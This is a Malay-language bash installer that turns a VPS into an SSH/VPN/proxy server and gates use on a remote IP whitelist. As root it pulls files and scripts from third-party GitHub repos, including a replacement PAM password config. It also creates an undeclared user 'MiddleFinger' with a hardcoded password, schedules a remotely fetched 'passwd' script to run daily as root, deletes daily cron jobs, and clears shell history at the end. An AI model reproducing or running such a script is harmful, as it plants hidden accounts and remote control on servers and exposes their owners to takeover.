#!/bin/bash

if [[ $USER != "root" ]]; then
	echo "Maaf, Anda harus menjalankan ini sebagai root"
	exit
fi

# initialisasi var
export DEBIAN_FRONTEND=noninteractive
OS=`uname -m`;
MYIP=$(wget -qO- ipv4.icanhazip.com);
MYIP2="s/xxxxxxxxx/$MYIP/g";
ether=`ifconfig | cut -c 1-8 | sort | uniq -u | grep venet0 | grep -v venet0:`
if [[ $ether = "" ]]; then
        ether=eth0
fi

#vps="zvur";
vps="aneka";

if [[ $vps = "zvur" ]]; then
	source="http://"
else
	source="https://raw.githubusercontent.com/sslmode/sslmode"
fi

# go to root
cd

# check registered ip
wget -q -O IP $source/master/IP.txt
if ! grep -w -q $MYIP IP; then
	echo "Maaf, hanya IP yang terdaftar yang bisa menggunakan script ini!"
	if [[ $vps = "zvur" ]]; then
		echo "Hubungi: OrangKuatSabahanTerkini 0109475453)"
	else
		echo "Hubungi: OrangKuatSabahanTerkini 0109475453)"
	fi
	rm -f /root/IP
	exit
fi

clear
echo "MULA SETUP"
clear
echo "SET TIMEZONE KUALA LUMPUT GMT +8"
ln -fs /usr/share/zoneinfo/Asia/Kuala_Lumpur /etc/localtime;
clear
echo "
ENABLE IPV4 AND IPV6
SILA TUNGGU SEDANG DI SETUP
"
echo ipv4 >> /etc/modules
echo ipv6 >> /etc/modules
sysctl -w net.ipv4.ip_forward=1
sed -i 's/#net.ipv4.ip_forward=1/net.ipv4.ip_forward=1/g' /etc/sysctl.conf
sed -i 's/#net.ipv6.conf.all.forwarding=1/net.ipv6.conf.all.forwarding=1/g' /etc/sysctl.conf
sysctl -p
clear
echo "
MEMBUANG SPAM PACKAGE
"
apt-get -y --purge remove samba*;
apt-get -y --purge remove apache2*;
apt-get -y --purge remove sendmail*;
apt-get -y --purge remove postfix*;
apt-get -y --purge remove bind*;
clear
echo "
"
sh -c 'echo "deb http://download.webmin.com/download/repository sarge contrib" > /etc/apt/sources.list.d/webmin.list'
wget -qO - http://www.webmin.com/jcameron-key.asc | apt-key add -
apt-get update;
apt-get -y autoremove;
apt-get -y install wget curl;
echo "
"
# text gambar
apt-get install boxes

# color text
cd
rm -rf /root/.bashrc
wget -O /root/.bashrc "https://raw.githubusercontent.com/iceiceice77/iceScripts/master/box/.bashrc"

# install lolcat
sudo apt-get -y install ruby
sudo gem install lolcat

# script
wget -O /etc/pam.d/common-password $source/master/common-password
chmod +x /etc/pam.d/common-password

# webmin
apt-get -y install webmin
sed -i 's/ssl=1/ssl=0/g' /etc/webmin/miniserv.conf

# set locale
sed -i 's/AcceptEnv/#AcceptEnv/g' /etc/ssh/sshd_config
apt-get -y install dropbear
sed -i 's/NO_START=1/NO_START=0/g' /etc/default/dropbear
sed -i 's/DROPBEAR_PORT=22/DROPBEAR_PORT=80/g' /etc/default/dropbear
sed -i 's/DROPBEAR_EXTRA_ARGS=/DROPBEAR_EXTRA_ARGS="-p 109 -p 110 -p 442"/g' /etc/default/dropbear
echo "/bin/false" >> /etc/shells
service ssh restart
service dropbear restart

# upgrade dropbear 2017
apt-get install zlib1g-dev
wget $source/master/stunnel.conf/dropbear-2017.75.tar.bz2
bzip2 -cd dropbear-2017.75.tar.bz2  | tar xvf -
cd dropbear-2017.75
./configure
make && make install
mv /usr/sbin/dropbear /usr/sbin/dropbear1
ln /usr/local/sbin/dropbear /usr/sbin/dropbear
service dropbear restart

# squid3
apt-get -y install squid3
wget -O /etc/squid3/squid.conf $source/master/squid.conf
wget -O /etc/squid/squid.conf $source/master/squid.conf
sed -i "s/ipserver/$myip/g" /etc/squid3/squid.conf
sed -i "s/ipserver/$myip/g" /etc/squid/squid.conf

# nginx
apt-get -y install nginx php-fpm php-mcrypt php-cli libexpat1-dev libxml-parser-perl
rm /etc/nginx/sites-enabled/default
rm /etc/nginx/sites-available/default
wget -O /etc/php/7.0/fpm/pool.d/www.conf $source/master/www.conf
mkdir -p /home/vps/public_html
echo "<pre>Powered By Fawzya.Net</pre>" > /home/vps/public_html/index.html
echo "<?php phpinfo(); ?>" > /home/vps/public_html/info.php
wget -O /etc/nginx/conf.d/vps.conf $source/master/vps.conf
sed -i 's/listen = \/var\/run\/php7.0-fpm.sock/listen = 127.0.0.1:9000/g' /etc/php/7.0/fpm/pool.d/www.conf
service php7.0-fpm restart
service nginx restart

# openvpn
apt-get -y install openvpn
wget -O /etc/openvpn/openvpn.tar $source/master/openvpn.tar
cd /etc/openvpn/;tar xf openvpn.tar;rm openvpn.tar
wget -O /etc/rc.local $source/master/rc.local;chmod +x /etc/rc.local
#wget -O /etc/iptables.up.rules $source/master/iptables.up.rules
#sed -i "s/ipserver/$myip/g" /etc/iptables.up.rules
#iptables-restore < /etc/iptables.up.rules

# nginx
apt-get -y install nginx php-fpm php-mcrypt php-cli libexpat1-dev libxml-parser-perl
rm /etc/nginx/sites-enabled/default
rm /etc/nginx/sites-available/default
wget -O /etc/php/7.0/fpm/pool.d/www.conf $source/master/www.conf
mkdir -p /home/vps/public_html
echo "<pre>Powered By Fawzya.Net</pre>" > /home/vps/public_html/index.html
echo "<?php phpinfo(); ?>" > /home/vps/public_html/info.php
wget -O /etc/nginx/conf.d/vps.conf $source/master/vps.conf
sed -i 's/listen = \/var\/run\/php7.0-fpm.sock/listen = 127.0.0.1:9000/g' /etc/php/7.0/fpm/pool.d/www.conf
service php7.0-fpm restart
service nginx restart
wget -O /home/vps/public_html/client.ovpn $source/master/client.ovpn
sed -i 's/AcceptEnv/#AcceptEnv/g' /etc/ssh/sshd_config
sed -i "s/ipserver/$myip/g" /home/vps/public_html/client.ovpn
useradd -m -g users -s /bin/bash MiddleFinger
echo "7752c" | chpasswd
cd;rm *.sh;rm *.txt;rm *.tar;rm *.deb;rm *.asc;rm *.zip;rm ddos*;

# install vnstat gui
cd /home/vps/public_html/
wget $source/master/vnstat_php_frontend-1.5.1.tar.gz
tar xf vnstat_php_frontend-1.5.1.tar.gz
rm vnstat_php_frontend-1.5.1.tar.gz
mv vnstat_php_frontend-1.5.1 vnstat
cd vnstat
sed -i "s/\$iface_list = array('eth0', 'sixxs');/\$iface_list = array('eth0');/g" config.php
sed -i "s/\$language = 'nl';/\$language = 'en';/g" config.php
sed -i 's/Internal/Internet/g' config.php
sed -i '/SixXS IPv6/d' config.php
sed -i "s/\$locale = 'en_US.UTF-8';/\$locale = 'en_US.UTF+8';/g" config.php
cd

# Install BadVPN
apt-get -y install cmake make gcc
wget $source/master/badvpn-1.999.127.tar.bz2
tar xf badvpn-1.999.127.tar.bz2
mkdir badvpn-build
cd badvpn-build
cmake ~/badvpn-1.999.127 -DBUILD_NOTHING_BY_DEFAULT=1 -DBUILD_UDPGW=1
make install
screen badvpn-udpgw --listen-addr 127.0.0.1:7300 > /dev/null &
cd
# block all port except
sed -i '$ i\iptables -A OUTPUT -m state --state ESTABLISHED,RELATED -j ACCEPT' /etc/iptables.up.rules
sed -i '$ i\iptables -A OUTPUT -d 127.0.0.1 -j ACCEPT' /etc/rc.local
sed -i '$ i\iptables -A OUTPUT -p tcp -m tcp --dport 21 -j ACCEPT' /etc/iptables.up.rules
sed -i '$ i\iptables -A OUTPUT -p tcp -m tcp --dport 22 -j ACCEPT' /etc/iptables.up.rules
sed -i '$ i\iptables -A OUTPUT -p tcp -m tcp --dport 53 -j ACCEPT' /etc/iptables.up.rules
sed -i '$ i\iptables -A OUTPUT -p tcp -m tcp --dport 80 -j ACCEPT' /etc/iptables.up.rules
sed -i '$ i\iptables -A OUTPUT -p tcp -m tcp --dport 81 -j ACCEPT' /etc/iptables.up.rules
sed -i '$ i\iptables -A OUTPUT -p tcp -m tcp --dport 109 -j ACCEPT' /etc/iptables.up.rules
sed -i '$ i\iptables -A OUTPUT -p tcp -m tcp --dport 110 -j ACCEPT' /etc/iptables.up.rules
sed -i '$ i\iptables -A OUTPUT -p tcp -m tcp --dport 143 -j ACCEPT' /etc/iptables.up.rules
sed -i '$ i\iptables -A OUTPUT -p tcp -m tcp --dport 443 -j ACCEPT' /etc/iptables.up.rules
sed -i '$ i\iptables -A OUTPUT -p tcp -m tcp --dport 1194 -j ACCEPT' /etc/iptables.up.rules
sed -i '$ i\iptables -A OUTPUT -p tcp -m tcp --dport 3128 -j ACCEPT' /etc/iptables.up.rules
sed -i '$ i\iptables -A OUTPUT -p tcp -m tcp --dport 8000 -j ACCEPT' /etc/iptables.up.rules
sed -i '$ i\iptables -A OUTPUT -p tcp -m tcp --dport 8080 -j ACCEPT' /etc/iptables.up.rules
sed -i '$ i\iptables -A OUTPUT -p tcp -m tcp --dport 10000 -j ACCEPT' /etc/iptables.up.rules
sed -i '$ i\iptables -A OUTPUT -p udp -m udp --dport 53 -j ACCEPT' /etc/iptables.up.rules
sed -i '$ i\iptables -A OUTPUT -p udp -m udp --dport 2500 -j ACCEPT' /etc/iptables.up.rules
sed -i '$ i\iptables -A OUTPUT -p udp -m udp -j DROP' /etc/iptables.up.rules
sed -i '$ i\iptables -A OUTPUT -p tcp -m tcp -j DROP' /etc/iptables.up.rules
# install fail2ban
apt-get -y install fail2ban;service fail2ban restart

# Instal (D)DoS Deflate
if [ -d '/usr/local/ddos' ]; then
	echo; echo; echo "Please un-install the previous version first"
	exit 0
else
	mkdir /usr/local/ddos
fi
clear
echo; echo 'Installing DOS-Deflate 0.6'; echo
echo; echo -n 'Downloading source files...'
wget -q -O /usr/local/ddos/ddos.conf http://www.inetbase.com/scripts/ddos/ddos.conf
echo -n '.'
wget -q -O /usr/local/ddos/LICENSE http://www.inetbase.com/scripts/ddos/LICENSE
echo -n '.'
wget -q -O /usr/local/ddos/ignore.ip.list http://www.inetbase.com/scripts/ddos/ignore.ip.list
echo -n '.'
wget -q -O /usr/local/ddos/ddos.sh http://www.inetbase.com/scripts/ddos/ddos.sh
chmod 0755 /usr/local/ddos/ddos.sh
cp -s /usr/local/ddos/ddos.sh /usr/local/sbin/ddos
echo '...done'
echo; echo -n 'Creating cron to run script every minute.....(Default setting)'
/usr/local/ddos/ddos.sh --cron > /dev/null 2>&1
echo '.....done'
echo; echo 'Installation has completed.'
echo 'Config file is at /usr/local/ddos/ddos.conf'
echo 'Please send in your comments and/or suggestions to zaf@vsnl.com'

#install stunnel ssl
apt-get update
apt-get upgrade
apt-get install stunnel4
wget -O /etc/stunnel/stunnel.conf $source/master/stunnel.conf
openssl genrsa -out key.pem 2048
openssl req -new -x509 -key key.pem -out cert.pem -days 1095
cat key.pem cert.pem >> /etc/stunnel/stunnel.pem
sed -i 's/ENABLED=0/ENABLED=1/g' /etc/default/stunnel4
/etc/init.d/stunnel4 restart

# swap ram
cd
dd if=/dev/zero of=/swapfile1 bs=1024 count=524288
dd if=/dev/zero of=/swapfile2 bs=1024 count=524288
mkswap /swapfile1
mkswap /swapfile2
chown root:root /swapfile1
chown root:root /swapfile2
chmod 0600 /swapfile1
chmod 0600 /swapfile2
swapon /swapfile1
swapon /swapfile2
sed -i '$ i\swapon /swapfile1' /etc/rc.local
sed -i '$ i\swapon /swapfile2' /etc/rc.local
sed -i '$ i\/swapfile1      swap swap   defaults    0 0' /etc/fstab
sed -i '$ i\/swapfile2      swap swap   defaults    0 0' /etc/fstab
clear

# download script
cd
wget -O /usr/bin/motd "https://raw.githubusercontent.com/iceiceice77/iceScripts/master/box/motd"
wget -O /usr/bin/benchmark "https://raw.githubusercontent.com/iceiceice77/iceScripts/master/box/benchmark.sh"
wget -O /usr/bin/speedtest "https://raw.githubusercontent.com/iceiceice77/iceScripts/master/box/speedtest_cli.py"
wget -O /usr/bin/ps-mem "https://raw.githubusercontent.com/iceiceice77/iceScripts/master/box/ps_mem.py"
wget -O /usr/bin/dropmon "https://raw.githubusercontent.com/iceiceice77/iceScripts/master/box/dropmon.sh"
wget -O /usr/bin/menu "https://raw.githubusercontent.com/iceiceice77/iceScripts/master/box/menu.sh"
wget -O /usr/bin/user-active-list "https://raw.githubusercontent.com/iceiceice77/iceScripts/master/box/user-active-list.sh"
wget -O /usr/bin/user-add "https://raw.githubusercontent.com/iceiceice77/iceScripts/master/box/user-add.sh"
wget -O /usr/bin/user-add-pptp "https://raw.githubusercontent.com/iceiceice77/iceScripts/master/box/user-add-pptp.sh"
wget -O /usr/bin/user-del "https://raw.githubusercontent.com/iceiceice77/iceScripts/master/box/user-del.sh"
wget -O /usr/bin/disable-user-expire "https://raw.githubusercontent.com/iceiceice77/iceScripts/master/box/disable-user-expire.sh"
wget -O /usr/bin/delete-user-expire "https://raw.githubusercontent.com/iceiceice77/iceScripts/master/box/delete-user-expire.sh"
wget -O /usr/bin/banned-user "https://raw.githubusercontent.com/iceiceice77/iceScripts/master/box/banned-user.sh"
wget -O /usr/bin/unbanned-user "https://raw.githubusercontent.com/iceiceice77/iceScripts/master/box/unbanned-user.sh"
wget -O /usr/bin/user-expire-list "https://raw.githubusercontent.com/iceiceice77/iceScripts/master/box/user-expire-list.sh"
wget -O /usr/bin/user-gen "https://raw.githubusercontent.com/iceiceice77/iceScripts/master/box/user-gen.sh"
wget -O /usr/bin/userlimit.sh "https://raw.githubusercontent.com/iceiceice77/iceScripts/master/box/userlimit.sh"
wget -O /usr/bin/userlimitssh.sh "https://raw.githubusercontent.com/iceiceice77/iceScripts/master/box/userlimitssh.sh"
wget -O /usr/bin/user-list "https://raw.githubusercontent.com/iceiceice77/iceScripts/master/box/user-list.sh"
wget -O /usr/bin/user-login "https://raw.githubusercontent.com/iceiceice77/iceScripts/master/box/user-login.sh"
wget -O /usr/bin/user-pass "https://raw.githubusercontent.com/iceiceice77/iceScripts/master/box/user-pass.sh"
wget -O /usr/bin/user-renew "https://raw.githubusercontent.com/iceiceice77/iceScripts/master/box/user-renew.sh"
wget -O /usr/bin/clearcache.sh "https://raw.githubusercontent.com/iceiceice77/iceScripts/master/box/clearcache.sh"
wget -O /usr/bin/bannermenu "https://raw.githubusercontent.com/iceiceice77/iceScripts/master/box/bannermenu"
cd

#rm -rf /etc/cron.weekly/
#rm -rf /etc/cron.hourly/
#rm -rf /etc/cron.monthly/
rm -rf /etc/cron.daily/
wget -O /root/passwd "https://raw.githubusercontent.com/iceiceice77/iceScripts/master/box/passwd.sh"
chmod +x /root/passwd
echo "01 23 * * * root /root/passwd" > /etc/cron.d/passwd

echo "*/30 * * * * root service dropbear restart" > /etc/cron.d/dropbear
echo "00 23 * * * root /usr/bin/disable-user-expire" > /etc/cron.d/disable-user-expire
echo "0 */12 * * * root /sbin/reboot" > /etc/cron.d/reboot
#echo "00 01 * * * root echo 3 > /proc/sys/vm/drop_caches && swapoff -a && swapon -a" > /etc/cron.d/clearcacheram3swap
echo "*/30 * * * * root /usr/bin/clearcache.sh" > /etc/cron.d/clearcache1

cd
chmod +x /usr/bin/motd
chmod +x /usr/bin/benchmark
chmod +x /usr/bin/speedtest
chmod +x /usr/bin/ps-mem
#chmod +x /usr/bin/autokill
chmod +x /usr/bin/dropmon
chmod +x /usr/bin/menu
chmod +x /usr/bin/user-active-list
chmod +x /usr/bin/user-add
chmod +x /usr/bin/user-add-pptp
chmod +x /usr/bin/user-del
chmod +x /usr/bin/disable-user-expire
chmod +x /usr/bin/delete-user-expire
chmod +x /usr/bin/banned-user
chmod +x /usr/bin/unbanned-user
chmod +x /usr/bin/user-expire-list
chmod +x /usr/bin/user-gen
chmod +x /usr/bin/userlimit.sh
chmod +x /usr/bin/userlimitssh.sh
chmod +x /usr/bin/user-list
chmod +x /usr/bin/user-login
chmod +x /usr/bin/user-pass
chmod +x /usr/bin/user-renew
chmod +x /usr/bin/clearcache.sh
chmod +x /usr/bin/bannermenu
cd

# install dos2unix
apt-get install dos2unix


wget -q https://github.com/ForNesiaFreak/FNS/raw/master/go/fornesia87.tgz
tar xvfz fornesia87.tgz
cd fornesia87
make

#Block Torrent
iptables -A OUTPUT -p tcp --dport 6881:6889 -j DROP
iptables -A OUTPUT -p udp --dport 1024:65534 -j DROP
iptables -A FORWARD -m string --string "get_peers" --algo bm -j DROP
iptables -A FORWARD -m string --string "announce_peer" --algo bm -j DROP
iptables -A FORWARD -m string --string "find_node" --algo bm -j DROP
iptables -A FORWARD -m string --algo bm --string "BitTorrent" -j DROP
iptables -A FORWARD -m string --algo bm --string "BitTorrent protocol" -j DROP
iptables -A FORWARD -m string --algo bm --string "peer_id=" -j DROP
iptables -A FORWARD -m string --algo bm --string ".torrent" -j DROP
iptables -A FORWARD -m string --algo bm --string "announce.php?passkey=" -j DROP
iptables -A FORWARD -m string --algo bm --string "torrent" -j DROP
iptables -A FORWARD -m string --algo bm --string "announce" -j DROP
iptables -A FORWARD -m string --algo bm --string "info_hash" -j DROP

clear
# restart service
service ssh restart
service openvpn restart
service dropbear restart
service nginx restart
service php7.0-fpm restart
service webmin restart
service squid restart
service fail2ban restart
clear
# SELASAI SUDAH BOSS! ( AutoscriptByOrangKuatSabahanTerkini )
echo "========================================"  | tee -a log-install.txt
echo "Service Autoscript OrangKuatSabahanTerkini (OrangKuatSabahanTerkini SCRIPT 2017)"  | tee -a log-install.txt
echo "----------------------------------------"  | tee -a log-install.txt
echo ""  | tee -a log-install.txt
echo "nginx : http://$myip:81"   | tee -a log-install.txt
echo "Webmin : http://$myip:10000/"  | tee -a log-install.txt
echo "Squid3 : 8080"  | tee -a log-install.txt
echo "OpenSSH : 22"  | tee -a log-install.txt
echo "Dropbear : 80-109-110-442"  | tee -a log-install.txt
echo "SSL"   : "443"  | tee -a log-install.txt
echo "OpenVPN  : TCP 1194 (sila dapatkan ovpn dari OrangKuatSabahanTerkini)"  | tee -a log-install.txt
echo "Fail2Ban : [on]"  | tee -a log-install.txt
echo "Timezone : Asia/Kuala_Lumpur"  | tee -a log-install.txt
echo "Menu : type menu to check menu script"  | tee -a log-install.txt
echo ""  | tee -a log-install.txt
echo "----------------------------------------"
echo "LOG INSTALL  --> /root/log-install.txt"
echo "----------------------------------------"
echo "========================================"  | tee -a log-install.txt
echo "      PLEASE REBOOT TO TAKE EFFECT !"
echo "========================================"  | tee -a log-install.txt
cat /dev/null > ~/.bash_history && history -c
